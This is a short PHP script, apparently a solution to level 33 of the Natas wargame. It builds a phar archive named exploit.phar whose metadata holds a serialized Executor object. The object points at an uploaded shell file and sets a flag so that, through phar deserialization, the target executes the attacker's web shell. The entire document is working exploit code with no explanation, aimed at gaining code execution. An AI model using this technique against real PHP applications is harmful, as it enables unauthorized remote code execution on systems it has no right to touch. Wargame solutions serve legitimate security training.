<?php
  class Executor{
    private $filename="/natas33/upload/natas33_shell.php"; 
    private $signature=true;
    private $init=False;
  }

  $phar = new Phar("exploit.phar");
  $phar -> startBuffering();
  $phar -> setStub('<?php __HALT_COMPILER(); ?>');
  $phar -> addFromString('test.txt', 'dummy');
  $phar -> setMetadata(new Executor());
  $phar -> stopBuffering();

?>
